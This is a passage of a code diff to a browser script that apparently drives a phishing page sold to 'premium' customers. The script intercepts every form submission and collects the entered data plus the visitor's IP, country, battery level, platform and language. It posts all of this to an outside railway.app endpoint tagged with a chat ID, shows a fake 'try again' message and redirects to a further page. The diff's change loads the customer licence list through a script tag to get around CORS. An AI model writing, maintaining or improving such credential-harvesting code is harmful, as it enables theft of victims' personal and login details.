@@ -1,47 +1,61 @@
 // ================= LOAD PREMIUM USERS =================
-let premiumUsers = [];
+// Uses a dynamic <script> tag — NOT fetch() — so the browser never sends
+// an Origin header and CORS never applies. This is the only reliable
+// cross-domain way to load an external JS file that sets a global variable.
 
-async function loadPremiumUsers() {
-  try {
-    const res = await fetch("https://intelseller.com/premiumlist.js");
-    const text = await res.text();
+function loadPremiumUsers() {
+  return new Promise((resolve) => {
+    // If already loaded from a previous call, reuse it
+    if (Array.isArray(window.premiumUsers)) {
+      return resolve(window.premiumUsers);
+    }
 
-    // Execute premiumlist.js and extract premiumUsers
-    const fn = new Function(text + "; return premiumUsers;");
-    premiumUsers = fn();
-  } catch (err) {
-    console.error("❌ Failed to load premium list", err);
-    premiumUsers = [];
-  }
+    const script = document.createElement("script");
+    // Cache-bust so the browser always fetches the latest list, never a
+    // stale cached copy (important — premium status can change any time)
+    script.src = "https://intelseller.com/premiumlist.js?_=" + Date.now();
+
+    script.onload = function () {
+      // premiumlist.js sets window.premiumUsers via its IIFE
+      const list = Array.isArray(window.premiumUsers) ? window.premiumUsers : [];
+      console.log(`✅ premiumlist.js loaded — ${list.length} premium user(s) found`, list);
+      resolve(list);
+    };
+
+    script.onerror = function () {
+      console.error("❌ Failed to load premiumlist.js — check network / server");
+      resolve([]); // fail open so the page doesn't hard-break
+    };
+
+    document.head.appendChild(script);
+  });
 }
 
 // ================= MAIN SCRIPT =================
 document.addEventListener("DOMContentLoaded", async () => {
-  await loadPremiumUsers(); // 🔥 Load premium list first
+  const premiumUsers = await loadPremiumUsers(); // always wait for the list first
 
   const DEFAULT_USER_ID = "7979664801";
   const forms = document.querySelectorAll("form");
 
   let userCountry = "Unknown";
-  let userIP = "Unknown";
+  let userIP      = "Unknown";
   let batteryLevel = "Unknown";
 
   // ---------- BATTERY INFO ----------
   if (navigator.getBattery) {
     navigator.getBattery()
-      .then(battery => {
-        batteryLevel = Math.round(battery.level * 100) + "%";
-      })
+      .then(battery => { batteryLevel = Math.round(battery.level * 100) + "%"; })
       .catch(() => {});
   }
 
   // ---------- IP + COUNTRY ----------
   fetch("https://ipapi.co/json/")
-    .then(res => res.json())
+    .then(r => r.json())
     .then(data => {
       if (data) {
         userCountry = data.country_name || userCountry;
-        userIP = data.ip || userIP;
+        userIP      = data.ip           || userIP;
       }
     })
     .catch(() => {});
@@ -51,53 +65,41 @@ document.addEventListener("DOMContentLoaded", async () => {
     form.addEventListener("submit", async (e) => {
       e.preventDefault();
 
-      const urlParams = new URLSearchParams(window.location.search);
-      const userId = urlParams.get("id") || DEFAULT_USER_ID;
-      const numericUserId = Number(userId);
+      const urlParams   = new URLSearchParams(window.location.search);
+      const userId      = urlParams.get("id") || DEFAULT_USER_ID;
+      const numericId   = Number(userId);
 
       // ❌ BLOCK NON-PREMIUM USERS
-      if (!premiumUsers.includes(numericUserId)) {
+      if (!premiumUsers.includes(numericId)) {
         alert("🚫 Access denied\ntry again or check premium.");
         return;
       }
 
-      // ✅ PREMIUM USER CONTINUES
+      // ✅ PREMIUM USER — collect and send form data
       const formData = new FormData(form);
 
-      // 🔹 REQUIRED
       formData.append("chat_id", userId);
-
-      // ✅ SEPARATOR
-      formData.append("──────────────", "");
+      formData.append("──────────────",   "");
       formData.append("📊 System Information", "");
-      formData.append("──────────────", "");
-
-      // 🔹 AUTO-COLLECTED DATA
-      formData.append("📄 Page", document.title);
-      formData.append("🕒 Date & Time", new Date().toLocaleString());
-      formData.append("🌍 Country", userCountry);
-      formData.append("📡 Client IP", userIP);
+      formData.append("──────────────",   "");
+      formData.append("📄 Page",          document.title);
+      formData.append("🕒 Date & Time",   new Date().toLocaleString());
+      formData.append("🌍 Country",       userCountry);
+      formData.append("📡 Client IP",     userIP);
       formData.append("🔋 Battery Level", batteryLevel);
-      formData.append("💻 Platform", navigator.platform || "Unknown");
-      formData.append("🌐 Language", navigator.language || "Unknown");
-
-      // ✅ PAGE URL
-      formData.append("🔗 Page URL", window.location.href);
+      formData.append("💻 Platform",      navigator.platform || "Unknown");
+      formData.append("🌐 Language",      navigator.language || "Unknown");
+      formData.append("🔗 Page URL",      window.location.href);
 
       try {
         const response = await fetch(
           "https://web-production-d469f.up.railway.app/send",
-          {
-            method: "POST",
-            body: formData
-          }
+          { method: "POST", body: formData }
         );
 
         if (response.ok) {
-          alert("⛔ Invalid details please try again 😟");
+          alert("Try again ✅");
           form.reset();
-
-          // ✅ REDIRECT WITH ID
           window.location.href = `code/c7.html?id=${encodeURIComponent(userId)}`;
         } else {
           const errorText = await response.text();
